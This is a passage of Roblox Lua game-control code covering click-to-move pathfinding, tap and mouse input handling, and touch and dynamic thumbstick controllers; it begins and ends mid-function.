					this.CurrentWaypointPlaneNormal	= ZERO_VECTOR3
					this.CurrentWaypointPlaneDistance = 0
				end

				return reached
			end

			function this:OnPointReached(reached)

				if reached and not this.Cancelled then
					-- First, destroyed the current displayed waypoint
					if this.setPointFunc then
						this.setPointFunc(this.CurrentPoint)
					end

					local nextWaypointIdx = this.CurrentPoint + 1

					if nextWaypointIdx > #this.pointList then
						-- End of path reached
						if this.stopTraverseFunc then
							this.stopTraverseFunc()
						end
						this.Finished:Fire()
						this:Cleanup()
					else
						local currentWaypoint = this.pointList[this.CurrentPoint]
						local nextWaypoint = this.pointList[nextWaypointIdx]

						-- If airborne, only allow to keep moving
						-- if nextWaypoint.Action ~= Jump, or path mantains a direction
						-- Otherwise, wait until the humanoid gets to the ground
						local currentState = this.Humanoid:GetState()
						local isInAir = currentState == Enum.HumanoidStateType.FallingDown
							or currentState == Enum.HumanoidStateType.Freefall
							or currentState == Enum.HumanoidStateType.Jumping

						if isInAir then
							local shouldWaitForGround = nextWaypoint.Action == Enum.PathWaypointAction.Jump
							if not shouldWaitForGround and this.CurrentPoint > 1 then
								local prevWaypoint = this.pointList[this.CurrentPoint - 1]

								local prevDir = currentWaypoint.Position - prevWaypoint.Position
								local currDir = nextWaypoint.Position - currentWaypoint.Position

								local prevDirXZ = Vector2.new(prevDir.x, prevDir.z).Unit
								local currDirXZ = Vector2.new(currDir.x, currDir.z).Unit

								local THRESHOLD_COS = 0.996 -- ~cos(5 degrees)
								shouldWaitForGround = prevDirXZ:Dot(currDirXZ) < THRESHOLD_COS
							end

							if shouldWaitForGround then
								this.Humanoid.FreeFalling:Wait()

								-- Give time to the humanoid's state to change
								-- Otherwise, the jump flag in Humanoid
								-- will be reset by the state change
								wait(0.1)
							end
						end

						-- Move to the next point
						if FFlagUserNavigationClickToMoveSkipPassedWaypoints then
							this:MoveToNextWayPoint(currentWaypoint, nextWaypoint, nextWaypointIdx)
						else
							if this.setPointFunc then
								this.setPointFunc(nextWaypointIdx)
							end
							if nextWaypoint.Action == Enum.PathWaypointAction.Jump then
								this.Humanoid.Jump = true
							end
							this.Humanoid:MoveTo(nextWaypoint.Position)

							this.CurrentPoint = nextWaypointIdx
						end
					end
				else
					this.PathFailed:Fire()
					this:Cleanup()
				end
			end

			function this:MoveToNextWayPoint(currentWaypoint, nextWaypoint, nextWaypointIdx)
				-- Build next destination plane
				-- (plane normal is perpendicular to the y plane and is from next waypoint towards current one (provided the two waypoints are not at the same location))
				-- (plane location is at next waypoint)
				this.CurrentWaypointPlaneNormal = currentWaypoint.Position - nextWaypoint.Position
				this.CurrentWaypointPlaneNormal = Vector3.new(this.CurrentWaypointPlaneNormal.X, 0, this.CurrentWaypointPlaneNormal.Z)
				if this.CurrentWaypointPlaneNormal.Magnitude > ALMOST_ZERO then
					this.CurrentWaypointPlaneNormal	= this.CurrentWaypointPlaneNormal.Unit
					this.CurrentWaypointPlaneDistance = this.CurrentWaypointPlaneNormal:Dot(nextWaypoint.Position)
				else
					-- Next waypoint is the same as current waypoint so no plane
					this.CurrentWaypointPlaneNormal	= ZERO_VECTOR3
					this.CurrentWaypointPlaneDistance = 0
				end

				-- Should we jump
				this.CurrentWaypointNeedsJump = nextWaypoint.Action == Enum.PathWaypointAction.Jump;

				-- Remember next waypoint position
				this.CurrentWaypointPosition = nextWaypoint.Position

				-- Move to next point
				this.CurrentPoint = nextWaypointIdx

				-- Finally reset Timeout
				this.Timeout = 0
			end

			function this:Start(overrideShowPath)
				if not this.AgentCanFollowPath then
					this.PathFailed:Fire()
					return
				end

				if this.Started then return end
				this.Started = true

				ClickToMoveDisplay.CancelFailureAnimation()

				if ShowPath then
					if overrideShowPath == nil or overrideShowPath then
						this.stopTraverseFunc, this.setPointFunc = ClickToMoveDisplay.CreatePathDisplay(this.pointList, this.OriginalTargetPoint)
					end
				end

				if #this.pointList > 0 then
					-- Determine the humanoid offset from the path's first point
					-- Offset of the first waypoint from the path's origin point
					this.HumanoidOffsetFromPath = Vector3.new(0, this.pointList[1].Position.Y - this.OriginPoint.Y, 0)

					-- As well as its current position and velocity
					this.CurrentHumanoidPosition = this.Humanoid.RootPart.Position + this.HumanoidOffsetFromPath
					this.CurrentHumanoidVelocity = this.Humanoid.RootPart.Velocity

					-- Connect to events
					this.SeatedConn = this.Humanoid.Seated:Connect(function(isSeated, seat) this:OnPathInterrupted() end)
					this.DiedConn = this.Humanoid.Died:Connect(function() this:OnPathInterrupted() end)
					this.TeleportedConn = this.Humanoid.RootPart:GetPropertyChangedSignal("CFrame"):Connect(function() this:OnPathInterrupted() end)

					-- Actually start
					this.CurrentPoint = 1 -- The first waypoint is always the start location. Skip it.
					this:OnPointReached(true) -- Move to first point
				else
					this.PathFailed:Fire()
					if this.stopTraverseFunc then
						this.stopTraverseFunc()
					end
				end
			end

			--We always raycast to the ground in the case that the user clicked a wall.
			local offsetPoint = this.TargetPoint + this.TargetSurfaceNormal*1.5
			local ray = Ray.new(offsetPoint, Vector3.new(0,-1,0)*50)
			local newHitPart, newHitPos = Workspace:FindPartOnRayWithIgnoreList(ray, getIgnoreList())
			if newHitPart then
				this.TargetPoint = newHitPos
			end
			this:ComputePath()

			return this
		end

		-------------------------------------------------------------------------

		local function CheckAlive()
			local humanoid = findPlayerHumanoid(Player)
			return humanoid ~= nil and humanoid.Health > 0
		end

		local function GetEquippedTool(character)
			if character ~= nil then
				for _, child in pairs(character:GetChildren()) do
					if child:IsA('Tool') then
						return child
					end
				end
			end
		end

		local ExistingPather = nil
		local ExistingIndicator = nil
		local PathCompleteListener = nil
		local PathFailedListener = nil

		local function CleanupPath()
			if ExistingPather then
				ExistingPather:Cancel()
				ExistingPather = nil
			end
			if PathCompleteListener then
				PathCompleteListener:Disconnect()
				PathCompleteListener = nil
			end
			if PathFailedListener then
				PathFailedListener:Disconnect()
				PathFailedListener = nil
			end
			if ExistingIndicator then
				ExistingIndicator:Destroy()
			end
		end

		local function HandleMoveTo(thisPather, hitPt, hitChar, character, overrideShowPath)
			if ExistingPather then
				CleanupPath()
			end
			ExistingPather = thisPather
			thisPather:Start(overrideShowPath)

			PathCompleteListener = thisPather.Finished.Event:Connect(function()
				CleanupPath()
				if hitChar then
					local currentWeapon = GetEquippedTool(character)
					if currentWeapon then
						currentWeapon:Activate()
					end
				end
			end)
			PathFailedListener = thisPather.PathFailed.Event:Connect(function()
				CleanupPath()
				if overrideShowPath == nil or overrideShowPath then
					local shouldPlayFailureAnim = PlayFailureAnimation and not (ExistingPather and ExistingPather:IsActive())
					if shouldPlayFailureAnim then
						ClickToMoveDisplay.PlayFailureAnimation()
					end
					ClickToMoveDisplay.DisplayFailureWaypoint(hitPt)
				end
			end)
		end

		local function ShowPathFailedFeedback(hitPt)
			if ExistingPather and ExistingPather:IsActive() then
				ExistingPather:Cancel()
			end
			if PlayFailureAnimation then
				ClickToMoveDisplay.PlayFailureAnimation()
			end
			ClickToMoveDisplay.DisplayFailureWaypoint(hitPt)
		end

		function OnTap(tapPositions, goToPoint, wasTouchTap)
			-- Good to remember if this is the latest tap event
			local camera = Workspace.CurrentCamera
			local character = Player.Character

			if not CheckAlive() then return end

			-- This is a path tap position
			if #tapPositions == 1 or goToPoint then
				if camera then
					local unitRay = camera:ScreenPointToRay(tapPositions[1].x, tapPositions[1].y)
					local ray = Ray.new(unitRay.Origin, unitRay.Direction*1000)

					local myHumanoid = findPlayerHumanoid(Player)
					local hitPart, hitPt, hitNormal = Utility.Raycast(ray, true, getIgnoreList())

					local hitChar, hitHumanoid = Utility.FindCharacterAncestor(hitPart)
					if wasTouchTap and hitHumanoid and StarterGui:GetCore("AvatarContextMenuEnabled") then
						local clickedPlayer = Players:GetPlayerFromCharacter(hitHumanoid.Parent)
						if clickedPlayer then
							CleanupPath()
							return
						end
					end
					if goToPoint then
						hitPt = goToPoint
						hitChar = nil
					end
					if hitPt and character then
						-- Clean up current path
						CleanupPath()
						local thisPather = Pather(hitPt, hitNormal)
						if thisPather:IsValidPath() then
							HandleMoveTo(thisPather, hitPt, hitChar, character)
						else
							-- Clean up
							thisPather:Cleanup()
							-- Feedback here for when we don't have a good path
							ShowPathFailedFeedback(hitPt)
						end
					end
				end
			elseif #tapPositions >= 2 then
				if camera then
					-- Do shoot
					local currentWeapon = GetEquippedTool(character)
					if currentWeapon then
						currentWeapon:Activate()
					end
				end
			end
		end

		local function DisconnectEvent(event)
			if event then
				event:Disconnect()
			end
		end

		--[[ The ClickToMove Controller Class ]]--
		local KeyboardController = _Keyboard()
		local ClickToMove = setmetatable({}, KeyboardController)
		ClickToMove.__index = ClickToMove

		function ClickToMove.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable(KeyboardController.new(CONTROL_ACTION_PRIORITY), ClickToMove)

			self.fingerTouches = {}
			self.numUnsunkTouches = 0
			-- PC simulation
			self.mouse1Down = tick()
			self.mouse1DownPos = Vector2.new()
			self.mouse2DownTime = tick()
			self.mouse2DownPos = Vector2.new()
			self.mouse2UpTime = tick()

			self.keyboardMoveVector = ZERO_VECTOR3

			self.tapConn = nil
			self.inputBeganConn = nil
			self.inputChangedConn = nil
			self.inputEndedConn = nil
			self.humanoidDiedConn = nil
			self.characterChildAddedConn = nil
			self.onCharacterAddedConn = nil
			self.characterChildRemovedConn = nil
			self.renderSteppedConn = nil
			self.menuOpenedConnection = nil

			self.running = false

			self.wasdEnabled = false

			return self
		end

		function ClickToMove:DisconnectEvents()
			DisconnectEvent(self.tapConn)
			DisconnectEvent(self.inputBeganConn)
			DisconnectEvent(self.inputChangedConn)
			DisconnectEvent(self.inputEndedConn)
			DisconnectEvent(self.humanoidDiedConn)
			DisconnectEvent(self.characterChildAddedConn)
			DisconnectEvent(self.onCharacterAddedConn)
			DisconnectEvent(self.renderSteppedConn)
			DisconnectEvent(self.characterChildRemovedConn)
			DisconnectEvent(self.menuOpenedConnection)
		end

		function ClickToMove:OnTouchBegan(input, processed)
			if self.fingerTouches[input] == nil and not processed then
				self.numUnsunkTouches = self.numUnsunkTouches + 1
			end
			self.fingerTouches[input] = processed
		end

		function ClickToMove:OnTouchChanged(input, processed)
			if self.fingerTouches[input] == nil then
				self.fingerTouches[input] = processed
				if not processed then
					self.numUnsunkTouches = self.numUnsunkTouches + 1
				end
			end
		end

		function ClickToMove:OnTouchEnded(input, processed)
			if self.fingerTouches[input] ~= nil and self.fingerTouches[input] == false then
				self.numUnsunkTouches = self.numUnsunkTouches - 1
			end
			self.fingerTouches[input] = nil
		end


		function ClickToMove:OnCharacterAdded(character)
			self:DisconnectEvents()

			self.inputBeganConn = UserInputService.InputBegan:Connect(function(input, processed)
				if input.UserInputType == Enum.UserInputType.Touch then
					self:OnTouchBegan(input, processed)
				end

				-- Cancel path when you use the keyboard controls if wasd is enabled.
				if self.wasdEnabled and processed == false and input.UserInputType == Enum.UserInputType.Keyboard
					and movementKeys[input.KeyCode] then
					CleanupPath()
					ClickToMoveDisplay.CancelFailureAnimation()
				end
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					self.mouse1DownTime = tick()
					self.mouse1DownPos = input.Position
				end
				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					self.mouse2DownTime = tick()
					self.mouse2DownPos = input.Position
				end
			end)

			self.inputChangedConn = UserInputService.InputChanged:Connect(function(input, processed)
				if input.UserInputType == Enum.UserInputType.Touch then
					self:OnTouchChanged(input, processed)
				end
			end)

			self.inputEndedConn = UserInputService.InputEnded:Connect(function(input, processed)
				if input.UserInputType == Enum.UserInputType.Touch then
					self:OnTouchEnded(input, processed)
				end

				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					self.mouse2UpTime = tick()
					local currPos = input.Position
					-- We allow click to move during path following or if there is no keyboard movement
					local allowed = ExistingPather or self.keyboardMoveVector.Magnitude <= 0
					if self.mouse2UpTime - self.mouse2DownTime < 0.25 and (currPos - self.mouse2DownPos).magnitude < 5 and allowed then
						local positions = {currPos}
						OnTap(positions)
					end
				end
			end)

			self.tapConn = UserInputService.TouchTap:Connect(function(touchPositions, processed)
				if not processed then
					OnTap(touchPositions, nil, true)
				end
			end)

			self.menuOpenedConnection = GuiService.MenuOpened:Connect(function()
				CleanupPath()
			end)

			local function OnCharacterChildAdded(child)
				if UserInputService.TouchEnabled then
					if child:IsA('Tool') then
						child.ManualActivationOnly = true
					end
				end
				if child:IsA('Humanoid') then
					DisconnectEvent(self.humanoidDiedConn)
					self.humanoidDiedConn = child.Died:Connect(function()
						if ExistingIndicator then
							DebrisService:AddItem(ExistingIndicator.Model, 1)
						end
					end)
				end
			end

			self.characterChildAddedConn = character.ChildAdded:Connect(function(child)
				OnCharacterChildAdded(child)
			end)
			self.characterChildRemovedConn = character.ChildRemoved:Connect(function(child)
				if UserInputService.TouchEnabled then
					if child:IsA('Tool') then
						child.ManualActivationOnly = false
					end
				end
			end)
			for _, child in pairs(character:GetChildren()) do
				OnCharacterChildAdded(child)
			end
		end

		function ClickToMove:Start()
			self:Enable(true)
		end

		function ClickToMove:Stop()
			self:Enable(false)
		end

		function ClickToMove:CleanupPath()
			CleanupPath()
		end

		function ClickToMove:Enable(enable, enableWASD, touchJumpController)
			if enable then
				if not self.running then
					if Player.Character then -- retro-listen
						self:OnCharacterAdded(Player.Character)
					end
					self.onCharacterAddedConn = Player.CharacterAdded:Connect(function(char)
						self:OnCharacterAdded(char)
					end)
					self.running = true
				end
				self.touchJumpController = touchJumpController
				if self.touchJumpController then
					self.touchJumpController:Enable(self.jumpEnabled)
				end
			else
				if self.running then
					self:DisconnectEvents()
					CleanupPath()
					-- Restore tool activation on shutdown
					if UserInputService.TouchEnabled then
						local character = Player.Character
						if character then
							for _, child in pairs(character:GetChildren()) do
								if child:IsA('Tool') then
									child.ManualActivationOnly = false
								end
							end
						end
					end
					self.running = false
				end
				if self.touchJumpController and not self.jumpEnabled then
					self.touchJumpController:Enable(true)
				end
				self.touchJumpController = nil
			end

			-- Extension for initializing Keyboard input as this class now derives from Keyboard
			if UserInputService.KeyboardEnabled and enable ~= self.enabled then

				self.forwardValue  = 0
				self.backwardValue = 0
				self.leftValue = 0
				self.rightValue = 0

				self.moveVector = ZERO_VECTOR3

				if enable then
					self:BindContextActions()
					self:ConnectFocusEventListeners()
				else
					self:UnbindContextActions()
					self:DisconnectFocusEventListeners()
				end
			end

			self.wasdEnabled = enable and enableWASD or false
			self.enabled = enable
		end

		function ClickToMove:OnRenderStepped(dt)
			-- Reset jump
			self.isJumping = false

			-- Handle Pather
			if ExistingPather then
				-- Let the Pather update
				ExistingPather:OnRenderStepped(dt)

				-- If we still have a Pather, set the resulting actions
				if ExistingPather then
					-- Setup move (NOT relative to camera)
					self.moveVector = ExistingPather.NextActionMoveDirection
					self.moveVectorIsCameraRelative = false

					-- Setup jump (but do NOT prevent the base Keayboard class from requesting jumps as well)
					if ExistingPather.NextActionJump then
						self.isJumping = true
					end
				else
					self.moveVector = self.keyboardMoveVector
					self.moveVectorIsCameraRelative = true
				end
			else
				self.moveVector = self.keyboardMoveVector
				self.moveVectorIsCameraRelative = true
			end

			-- Handle Keyboard's jump
			if self.jumpRequested then
				self.isJumping = true
			end
		end

		-- Overrides Keyboard:UpdateMovement(inputState) to conditionally consider self.wasdEnabled and let OnRenderStepped handle the movement
		function ClickToMove:UpdateMovement(inputState)
			if inputState == Enum.UserInputState.Cancel then
				self.keyboardMoveVector = ZERO_VECTOR3
			elseif self.wasdEnabled then
				self.keyboardMoveVector = Vector3.new(self.leftValue + self.rightValue, 0, self.forwardValue + self.backwardValue)
			end
		end

		-- Overrides Keyboard:UpdateJump() because jump is handled in OnRenderStepped
		function ClickToMove:UpdateJump()
			-- Nothing to do (handled in OnRenderStepped)
		end

		--Public developer facing functions
		function ClickToMove:SetShowPath(value)
			ShowPath = value
		end

		function ClickToMove:GetShowPath()
			return ShowPath
		end

		function ClickToMove:SetWaypointTexture(texture)
			ClickToMoveDisplay.SetWaypointTexture(texture)
		end

		function ClickToMove:GetWaypointTexture()
			return ClickToMoveDisplay.GetWaypointTexture()
		end

		function ClickToMove:SetWaypointRadius(radius)
			ClickToMoveDisplay.SetWaypointRadius(radius)
		end

		function ClickToMove:GetWaypointRadius()
			return ClickToMoveDisplay.GetWaypointRadius()
		end

		function ClickToMove:SetEndWaypointTexture(texture)
			ClickToMoveDisplay.SetEndWaypointTexture(texture)
		end

		function ClickToMove:GetEndWaypointTexture()
			return ClickToMoveDisplay.GetEndWaypointTexture()
		end

		function ClickToMove:SetWaypointsAlwaysOnTop(alwaysOnTop)
			ClickToMoveDisplay.SetWaypointsAlwaysOnTop(alwaysOnTop)
		end

		function ClickToMove:GetWaypointsAlwaysOnTop()
			return ClickToMoveDisplay.GetWaypointsAlwaysOnTop()
		end

		function ClickToMove:SetFailureAnimationEnabled(enabled)
			PlayFailureAnimation = enabled
		end

		function ClickToMove:GetFailureAnimationEnabled()
			return PlayFailureAnimation
		end

		function ClickToMove:SetIgnoredPartsTag(tag)
			UpdateIgnoreTag(tag)
		end

		function ClickToMove:GetIgnoredPartsTag()
			return CurrentIgnoreTag
		end

		function ClickToMove:SetUseDirectPath(directPath)
			UseDirectPath = directPath
		end

		function ClickToMove:GetUseDirectPath()
			return UseDirectPath
		end

		function ClickToMove:SetAgentSizeIncreaseFactor(increaseFactorPercent)
			AgentSizeIncreaseFactor = 1.0 + (increaseFactorPercent / 100.0)
		end

		function ClickToMove:GetAgentSizeIncreaseFactor()
			return (AgentSizeIncreaseFactor - 1.0) * 100.0
		end

		function ClickToMove:SetUnreachableWaypointTimeout(timeoutInSec)
			UnreachableWaypointTimeout = timeoutInSec
		end

		function ClickToMove:GetUnreachableWaypointTimeout()
			return UnreachableWaypointTimeout
		end

		function ClickToMove:SetUserJumpEnabled(jumpEnabled)
			self.jumpEnabled = jumpEnabled
			if self.touchJumpController then
				self.touchJumpController:Enable(jumpEnabled)
			end
		end

		function ClickToMove:GetUserJumpEnabled()
			return self.jumpEnabled
		end

		function ClickToMove:MoveTo(position, showPath, useDirectPath)
			local character = Player.Character
			if character == nil then
				return false
			end
			local thisPather = Pather(position, Vector3.new(0, 1, 0), useDirectPath)
			if thisPather and thisPather:IsValidPath() then
				HandleMoveTo(thisPather, position, nil, character, showPath)
				return true
			end
			return false
		end

		return ClickToMove
	end

	function _TouchThumbstick()
		local Players = game:GetService("Players")
		local GuiService = game:GetService("GuiService")
		local UserInputService = game:GetService("UserInputService")
		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local TOUCH_CONTROL_SHEET = "rbxasset://textures/ui/TouchControlsSheet.png"
		--[[ The Module ]]--
		local BaseCharacterController = _BaseCharacterController()
		local TouchThumbstick = setmetatable({}, BaseCharacterController)
		TouchThumbstick.__index = TouchThumbstick
		function TouchThumbstick.new()
			local self = setmetatable(BaseCharacterController.new(), TouchThumbstick)

			self.isFollowStick = false

			self.thumbstickFrame = nil
			self.moveTouchObject = nil
			self.onTouchMovedConn = nil
			self.onTouchEndedConn = nil
			self.screenPos = nil
			self.stickImage = nil
			self.thumbstickSize = nil -- Float

			return self
		end
		function TouchThumbstick:Enable(enable, uiParentFrame)
			if enable == nil then return false end			-- If nil, return false (invalid argument)
			enable = enable and true or false				-- Force anything non-nil to boolean before comparison
			if self.enabled == enable then return true end	-- If no state change, return true indicating already in requested state

			self.moveVector = ZERO_VECTOR3
			self.isJumping = false

			if enable then
				-- Enable
				if not self.thumbstickFrame then
					self:Create(uiParentFrame)
				end
				self.thumbstickFrame.Visible = true
			else 
				-- Disable
				self.thumbstickFrame.Visible = false
				self:OnInputEnded()
			end
			self.enabled = enable
		end
		function TouchThumbstick:OnInputEnded()
			self.thumbstickFrame.Position = self.screenPos
			self.stickImage.Position = UDim2.new(0, self.thumbstickFrame.Size.X.Offset/2 - self.thumbstickSize/4, 0, self.thumbstickFrame.Size.Y.Offset/2 - self.thumbstickSize/4)

			self.moveVector = ZERO_VECTOR3
			self.isJumping = false
			self.thumbstickFrame.Position = self.screenPos
			self.moveTouchObject = nil
		end
		function TouchThumbstick:Create(parentFrame)

			if self.thumbstickFrame then
				self.thumbstickFrame:Destroy()
				self.thumbstickFrame = nil
				if self.onTouchMovedConn then
					self.onTouchMovedConn:Disconnect()
					self.onTouchMovedConn = nil
				end
				if self.onTouchEndedConn then
					self.onTouchEndedConn:Disconnect()
					self.onTouchEndedConn = nil
				end
			end

			local minAxis = math.min(parentFrame.AbsoluteSize.x, parentFrame.AbsoluteSize.y)
			local isSmallScreen = minAxis <= 500
			self.thumbstickSize = isSmallScreen and 70 or 120
			self.screenPos = isSmallScreen and UDim2.new(0, (self.thumbstickSize/2) - 10, 1, -self.thumbstickSize - 20) or
				UDim2.new(0, self.thumbstickSize/2, 1, -self.thumbstickSize * 1.75)

			self.thumbstickFrame = Instance.new("Frame")
			self.thumbstickFrame.Name = "ThumbstickFrame"
			self.thumbstickFrame.Active = true
			self.thumbstickFrame.Visible = false
			self.thumbstickFrame.Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize)
			self.thumbstickFrame.Position = self.screenPos
			self.thumbstickFrame.BackgroundTransparency = 1

			local outerImage = Instance.new("ImageLabel")
			outerImage.Name = "OuterImage"
			outerImage.Image = TOUCH_CONTROL_SHEET
			outerImage.ImageRectOffset = Vector2.new()
			outerImage.ImageRectSize = Vector2.new(220, 220)
			outerImage.BackgroundTransparency = 1
			outerImage.Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize)
			outerImage.Position = UDim2.new(0, 0, 0, 0)
			outerImage.Parent = self.thumbstickFrame

			self.stickImage = Instance.new("ImageLabel")
			self.stickImage.Name = "StickImage"
			self.stickImage.Image = TOUCH_CONTROL_SHEET
			self.stickImage.ImageRectOffset = Vector2.new(220, 0)
			self.stickImage.ImageRectSize = Vector2.new(111, 111)
			self.stickImage.BackgroundTransparency = 1
			self.stickImage.Size = UDim2.new(0, self.thumbstickSize/2, 0, self.thumbstickSize/2)
			self.stickImage.Position = UDim2.new(0, self.thumbstickSize/2 - self.thumbstickSize/4, 0, self.thumbstickSize/2 - self.thumbstickSize/4)
			self.stickImage.ZIndex = 2
			self.stickImage.Parent = self.thumbstickFrame

			local centerPosition = nil
			local deadZone = 0.05

			local function DoMove(direction)

				local currentMoveVector = direction / (self.thumbstickSize/2)

				-- Scaled Radial Dead Zone
				local inputAxisMagnitude = currentMoveVector.magnitude
				if inputAxisMagnitude < deadZone then
					currentMoveVector = Vector3.new()
				else
					currentMoveVector = currentMoveVector.unit * ((inputAxisMagnitude - deadZone) / (1 - deadZone))
					-- NOTE: Making currentMoveVector a unit vector will cause the player to instantly go max speed
					-- must check for zero length vector is using unit
					currentMoveVector = Vector3.new(currentMoveVector.x, 0, currentMoveVector.y)
				end

				self.moveVector = currentMoveVector
			end

			local function MoveStick(pos)
				local relativePosition = Vector2.new(pos.x - centerPosition.x, pos.y - centerPosition.y)
				local length = relativePosition.magnitude
				local maxLength = self.thumbstickFrame.AbsoluteSize.x/2
				if self.isFollowStick and length > maxLength then
					local offset = relativePosition.unit * maxLength
					self.thumbstickFrame.Position = UDim2.new(
						0, pos.x - self.thumbstickFrame.AbsoluteSize.x/2 - offset.x,
						0, pos.y - self.thumbstickFrame.AbsoluteSize.y/2 - offset.y)
				else
					length = math.min(length, maxLength)
					relativePosition = relativePosition.unit * length
				end
				self.stickImage.Position = UDim2.new(0, relativePosition.x + self.stickImage.AbsoluteSize.x/2, 0, relativePosition.y + self.stickImage.AbsoluteSize.y/2)
			end

			-- input connections
			self.thumbstickFrame.InputBegan:Connect(function(inputObject)
				--A touch that starts elsewhere on the screen will be sent to a frame's InputBegan event
				--if it moves over the frame. So we check that this is actually a new touch (inputObject.UserInputState ~= Enum.UserInputState.Begin)
				if self.moveTouchObject or inputObject.UserInputType ~= Enum.UserInputType.Touch
					or inputObject.UserInputState ~= Enum.UserInputState.Begin then
					return
				end

				self.moveTouchObject = inputObject
				self.thumbstickFrame.Position = UDim2.new(0, inputObject.Position.x - self.thumbstickFrame.Size.X.Offset/2, 0, inputObject.Position.y - self.thumbstickFrame.Size.Y.Offset/2)
				centerPosition = Vector2.new(self.thumbstickFrame.AbsolutePosition.x + self.thumbstickFrame.AbsoluteSize.x/2,
					self.thumbstickFrame.AbsolutePosition.y + self.thumbstickFrame.AbsoluteSize.y/2)
				local direction = Vector2.new(inputObject.Position.x - centerPosition.x, inputObject.Position.y - centerPosition.y)
			end)

			self.onTouchMovedConn = UserInputService.TouchMoved:Connect(function(inputObject, isProcessed)
				if inputObject == self.moveTouchObject then
					centerPosition = Vector2.new(self.thumbstickFrame.AbsolutePosition.x + self.thumbstickFrame.AbsoluteSize.x/2,
						self.thumbstickFrame.AbsolutePosition.y + self.thumbstickFrame.AbsoluteSize.y/2)
					local direction = Vector2.new(inputObject.Position.x - centerPosition.x, inputObject.Position.y - centerPosition.y)
					DoMove(direction)
					MoveStick(inputObject.Position)
				end
			end)

			self.onTouchEndedConn = UserInputService.TouchEnded:Connect(function(inputObject, isProcessed)
				if inputObject == self.moveTouchObject then
					self:OnInputEnded()
				end
			end)

			GuiService.MenuOpened:Connect(function()
				if self.moveTouchObject then
					self:OnInputEnded()
				end
			end)	

			self.thumbstickFrame.Parent = parentFrame
		end
		return TouchThumbstick
	end

	function _DynamicThumbstick()
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local TOUCH_CONTROLS_SHEET = "rbxasset://textures/ui/Input/TouchControlsSheetV2.png"

		local DYNAMIC_THUMBSTICK_ACTION_NAME = "DynamicThumbstickAction"
		local DYNAMIC_THUMBSTICK_ACTION_PRIORITY = Enum.ContextActionPriority.High.Value

		local MIDDLE_TRANSPARENCIES = {
			1 - 0.89,
			1 - 0.70,
			1 - 0.60,
			1 - 0.50,
			1 - 0.40,
			1 - 0.30,
			1 - 0.25
		}
		local NUM_MIDDLE_IMAGES = #MIDDLE_TRANSPARENCIES

		local FADE_IN_OUT_BACKGROUND = true
		local FADE_IN_OUT_MAX_ALPHA = 0.35

		local FADE_IN_OUT_HALF_DURATION_DEFAULT = 0.3
		local FADE_IN_OUT_BALANCE_DEFAULT = 0.5
		local ThumbstickFadeTweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)

		local Players = game:GetService("Players")
		local GuiService = game:GetService("GuiService")
		local UserInputService = game:GetService("UserInputService")
		local ContextActionService = game:GetService("ContextActionService")
		local RunService = game:GetService("RunService")
		local TweenService = game:GetService("TweenService")

		local LocalPlayer = Players.LocalPlayer
		if not LocalPlayer then
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			LocalPlayer = Players.LocalPlayer
		end

		--[[ The Module ]]--
		local BaseCharacterController = _BaseCharacterController()
		local DynamicThumbstick = setmetatable({}, BaseCharacterController)
		DynamicThumbstick.__index = DynamicThumbstick

		function DynamicThumbstick.new()
			local self = setmetatable(BaseCharacterController.new(), DynamicThumbstick)

			self.moveTouchObject = nil
			self.moveTouchLockedIn = false
			self.moveTouchFirstChanged = false
			self.moveTouchStartPosition = nil

			self.startImage = nil
			self.endImage = nil
			self.middleImages = {}

			self.startImageFadeTween = nil
			self.endImageFadeTween = nil
			self.middleImageFadeTweens = {}

			self.isFirstTouch = true

			self.thumbstickFrame = nil

			self.onRenderSteppedConn = nil

			self.fadeInAndOutBalance = FADE_IN_OUT_BALANCE_DEFAULT
			self.fadeInAndOutHalfDuration = FADE_IN_OUT_HALF_DURATION_DEFAULT
			self.hasFadedBackgroundInPortrait = false
			self.hasFadedBackgroundInLandscape = false

			self.tweenInAlphaStart = nil
			self.tweenOutAlphaStart = nil

			return self
		end

		-- Note: Overrides base class GetIsJumping with get-and-clear behavior to do a single jump
		-- rather than sustained jumping. This is only to preserve the current behavior through the refactor.
		function DynamicThumbstick:GetIsJumping()
			local wasJumping = self.isJumping
			self.isJumping = false
			return wasJumping
		end

		function DynamicThumbstick:Enable(enable, uiParentFrame)
			if enable == nil then return false end			-- If nil, return false (invalid argument)
			enable = enable and true or false				-- Force anything non-nil to boolean before comparison
			if self.enabled == enable then return true end	-- If no state change, return true indicating already in requested state

			if enable then
				-- Enable
				if not self.thumbstickFrame then
					self:Create(uiParentFrame)
				end

				self:BindContextActions()
			else
				ContextActionService:UnbindAction(DYNAMIC_THUMBSTICK_ACTION_NAME)
				-- Disable
				self:OnInputEnded() -- Cleanup
			end

			self.enabled = enable
			self.thumbstickFrame.Visible = enable
		end

		-- Was called OnMoveTouchEnded in previous version
		function DynamicThumbstick:OnInputEnded()
			self.moveTouchObject = nil
			self.moveVector = ZERO_VECTOR3
			self:FadeThumbstick(false)
		end

		function DynamicThumbstick:FadeThumbstick(visible)
			if not visible and self.moveTouchObject then
				return
			end
			if self.isFirstTouch then return end

			if self.startImageFadeTween then
				self.startImageFadeTween:Cancel()
			end
			if self.endImageFadeTween then
				self.endImageFadeTween:Cancel()
			end
			for i = 1, #self.middleImages do
				if self.middleImageFadeTweens[i] then
					self.middleImageFadeTweens[i]:Cancel()
				end
			end

			if visible then
				self.startImageFadeTween = TweenService:Create(self.startImage, ThumbstickFadeTweenInfo, { ImageTransparency = 0 })
				self.startImageFadeTween:Play()

				self.endImageFadeTween = TweenService:Create(self.endImage, ThumbstickFadeTweenInfo, { ImageTransparency = 0.2 })
				self.endImageFadeTween:Play()

				for i = 1, #self.middleImages do
					self.middleImageFadeTweens[i] = TweenService:Create(self.middleImages[i], ThumbstickFadeTweenInfo, { ImageTransparency = MIDDLE_TRANSPARENCIES[i] })
					self.middleImageFadeTweens[i]:Play()
				end
			else
				self.startImageFadeTween = TweenService:Create(self.startImage, ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
				self.startImageFadeTween:Play()

